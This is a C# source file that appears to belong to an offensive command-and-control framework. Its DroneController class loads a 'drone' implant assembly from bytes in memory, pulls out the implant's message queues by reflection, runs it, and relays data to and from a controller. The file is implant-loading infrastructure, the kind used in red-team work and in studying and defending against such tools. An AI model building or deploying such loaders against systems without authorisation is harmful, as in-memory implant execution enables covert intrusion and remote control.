using System;
using System.Collections.Concurrent;
using System.Reflection;
using System.Threading;
using System.Threading.Tasks;

namespace ExternalC2.Net.Client;

/// <summary>
/// Controller to handle connection to Drone
/// </summary>
public sealed class DroneController : IDisposable
{
    private ConcurrentQueue<byte[]> _inbound;
    private ConcurrentQueue<byte[]> _outbound;

    private readonly CancellationTokenSource _tokenSource = new();

    public Func<byte[], Task> OnDataFromDrone { get; set; }

    /// <summary>
    /// Executes the Drone
    /// </summary>
    /// <param name="payload"></param>
    /// <returns></returns>
    public void ExecutePayload(byte[] payload)
    {
        // load drone
        var asm = Assembly.Load(payload);
        
        // get the ext comm module
        var commModule = asm.GetType("Drone.CommModules.ExtCommModule");
        
        // get the inbound and outbound queues
        _inbound = commModule.GetProperty("Inbound")!.GetValue(null, null) as ConcurrentQueue<byte[]>;
        _outbound = commModule.GetProperty("Outbound")!.GetValue(null, null) as ConcurrentQueue<byte[]>;
        
        // exec the drone
        asm.GetType("Drone.Program")!.GetMethod("Execute")!.Invoke(null, Array.Empty<object>());

        _ = Task.Run(ReadTask);
    }

    private void ReadTask()
    {
        while (!_tokenSource.IsCancellationRequested)
        {
            while (_outbound.TryDequeue(out var outbound))
                OnDataFromDrone?.Invoke(outbound);

            Thread.Sleep(100);
        }
    }

    /// <summary>
    /// Send data to the Drone
    /// </summary>
    /// <param name="data"></param>
    public void SendDrone(byte[] data)
    {
        _inbound.Enqueue(data);
    }

    public void Dispose()
    {
        _tokenSource.Cancel();
    }
}